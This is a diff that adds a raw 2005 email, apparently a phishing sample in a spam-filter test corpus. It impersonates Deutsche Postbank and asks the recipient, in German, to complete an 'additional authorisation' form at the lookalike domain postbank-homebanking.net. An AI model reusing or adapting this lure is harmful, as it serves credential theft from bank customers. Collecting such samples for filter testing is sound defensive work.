@@ -1,0 +1,144 @@
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id 5837C2A88C
+	for <user@example.com>; Thu, 11 Aug 2005 17:55:57 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+	id 4EC5F621CAB; Thu, 11 Aug 2005 17:55:57 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by mail.example.com (Example mail relay) with ESMTP id 34964621CA4
+	for <user@example.com>; Thu, 11 Aug 2005 17:55:57 -0400 (EDT)
+Received: (from user@localhost)
+	by mail.example.com id RAA08774
+	for user@example.com; Thu, 11 Aug 2005 17:55:56 -0400
+Received: from zfree.co.nz ([200.37.123.19])
+	by mail.example.com with SMTP id RAA08766
+	for <user@example.com>; Thu, 11 Aug 2005 17:55:37 -0400
+Received: from postbank.de (mailrelay1.bonn.postbank.de [213.61.167.250])
+	by zfree.co.nz (Postfix) with ESMTP id 07E0C69596
+	for <user@example.com>; Thu, 11 Aug 2005 16:56:58 -0500
+From: Administration der Postbank <info@postbank.de>
+To: Jose <user@example.com>
+Subject: Administration der Postbank
+Date: Thu, 11 Aug 2005 16:56:58 -0500
+Message-ID: <100101c59ebf$d57ab393$d08b0e72@postbank.de>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Priority: 3 (Normal)
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook, Build 10.0.2616
+Importance: Normal
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1106
+X-AntiVirus: checked by AntiVir MailGate (version: 2.0.1.5; AVE: 6.17.0.2; VDF: 6.17.0.5; host: zfree.co.nz)
+Content-Length: 3237
+Lines: 102
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 77
+
+<html>
+<head>
+<title>Postbank</title>
+<style type=3d"text/css"><!--
+body, img {
+  border: 0px;
+  margin: 0px;
+}
+
+=2e=2etext, =2etext * td {
+=09font-family:arial,geneva,helvetica,sans-serif;
+=09font-size: 12px;
+=09color: #000066;
+=09font-weight: normal;
+}
+
+=2e=2etext a, =2etext * td a,
+=2e=2etext a:active, =2etext * td a:active,
+=2e=2etext a:visited, =2etext * td a:visited {=20
+=09font-family: arial,geneva,helvetica,sans-serif;
+=09font-weight: bold;
+=09color: #000066;
+=09text-decoration: underline;
+}
+
+=2e=2etext a:hover, =2etext * td a:hover {=20
+=09font-family: arial,geneva,helvetica,sans-serif;
+=09font-weight: bold;
+=09color: #000066;
+=09text-decoration: none;
+}
+--></style>
+</head>
+<body bgcolor=3d"#ffffff">
+<table width=3d"100%" height=3d"100%" border=3d"0" cellpadding=3d"0" cell=
+spacing=3d"0" valign=3d"top">
+=09<tr height=3d"100%">
+=09=09<td width=3d"50%"></td>
+=09=09<td width=3d"616" valign=3d"top">
+=09=09=09<table border=3d"0" cellpadding=3d"0" cellspacing=3d"0" valign=3d=
+"top" width=3d"616" height=3d"100%">
+=09=09=09=09<tr height=3d"10">
+=09=09=09=09=09<td width=3d"616"><br><br></td>
+=09=09=09=09</tr>
+=09=09=09=09<tr height=3d"16">
+=09=09=09=09=09<td width=3d"616" bgcolor=3d"#000066"></td>
+=09=09=09=09</tr>
+=09=09=09=09<tr height=3d"67">
+=09=09=09=09=09<td width=3d"616"><img src=3d"http://www=2epostbank-homeba=
+nking=2enet/logo=2ejpg" width=3d"616" height=3d"67" alt=3d""></td>
+=09=09=09=09</tr>
+=09=09=09=09<tr height=3d"16">
+=09=09=09=09=09<td width=3d"616" bgcolor=3d"#cocceo"></td>
+=09=09=09=09</tr>
+=09=09=09=09<tr height=3d"300">
+=09=09=09=09=09<td width=3d"616" valign=3d"top" class=3d"text">
+<br><br>
+Sehr geehrter Kunde,
+<br><br>
+Da zur Zeit  die Betr&uuml;gereien  mit den Bankkonten von unseren Kunden=
+ h&auml;ufig geworden sind, m&uuml;ssen wir notgedrungen nachtr&auml;glic=
+h eine zus&auml;tzliche Autorisation von den Kontobesitzern durchf&uuml;h=
+ren=2e=20
+<br>
+Der Sicherheitsdienst der Postbank traf die Entscheidung, eine neue Siche=
+rung von den Daten vorzunehmen=2e Dazu  wurden von unseren Spezialisten s=
+owohl die Protokolle der Informations-&uuml;bertragung, als auch die Kodi=
+erungssart der &uuml;bertragenen Daten erneuert=2e=20
+<br><br>
+Im Zusammenhang damit, bitten wir Sie, eine spezielle <b>Form der zus&aum=
+l;tzlichen Autorisation</b> auszuf&uuml;llen=2e=20
+<br><br>
+<div align=3d"center"><a href=3d"http://www=2epostbank-homebanking=2enet"=
+><img src=3d"http://www=2epostbank-homebanking=2enet/clickhere=2egif" wid=
+th=3d"150" height=3d"30" alt=3d""></a></div>
+<br><br>
+Diese  Sofortma&#223;nahmen wurden nur zur Sicherung der Interessen von u=
+nseren Kunden getroffen=2e=20
+<br><br>
+Danke f&uuml;r die Mitarbeit,<br>
+Administration der Postbank
+<br><br><br>
+=09=09=09=09
+=09=09=09=09=09</td>
+=09=09=09=09</tr>
+=09=09=09=09<tr height=3d"16">
+=09=09=09=09=09<td width=3d"616" bgcolor=3d"#cocceo"></td>
+=09=09=09=09</tr>
+=09=09=09=09<tr height=3d"16">
+=09=09=09=09=09<td width=3d"616" align=3d"right" class=3d"text"><small>=a9=
+ 2004 Deutsche Postbank AG</small></td>
+=09=09=09=09</tr>
+=09=09=09=09<tr height=3d"100%">
+=09=09=09=09=09<td width=3d"616"></td>
+=09=09=09=09</tr>
+=09=09=09</table>
+=09=09</td>
+=09=09<td width=3d"50%"></td>=09
+=09</tr>
+</table>
+</body>
+</html>
+
